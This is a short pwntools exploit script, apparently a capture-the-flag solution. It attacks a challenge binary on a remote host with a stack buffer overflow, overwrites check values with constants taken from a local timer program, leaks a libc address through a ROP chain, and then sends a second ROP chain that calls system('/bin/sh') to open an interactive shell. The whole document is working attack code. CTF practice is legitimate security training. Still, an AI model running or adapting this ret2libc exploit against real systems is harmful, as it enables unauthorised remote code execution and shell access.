#!/usr/bin/env python3



from pwn import *



e = ELF("./chall")
libc = ELF("./libc_cc411543-f26e-4504-97f8-057d0ecea8f7.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]
#r = process("./chall")
r = remote("gc1.eng.run",30245)
r2 = process("./timer")
val = int(r2.recvline().strip())
val2 = int(r2.recvline().strip())
exploit = b"A" * 40 + p64(val) + p64(0xc0cacede) + p64(0xfacefeed) + p64(0x183b02d47) +   b"A" * 16 + p64(pop_rdi) + p64(e.got.puts) + p64(e.plt.puts) + p64(e.sym.vuln)
r.sendline(exploit)
r.recvline(b"Please enter your name:")
leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
libc_base = leak - libc.sym.puts
exploit = b"A" * 40 + p64(val2) + p64(0xc0cacede) + p64(0xfacefeed) + p64(0x183b02d47) +   b"A" * 16  + p64(ret) + p64(pop_rdi) 
exploit+=p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system)
r.sendline(exploit)
r.interactive()
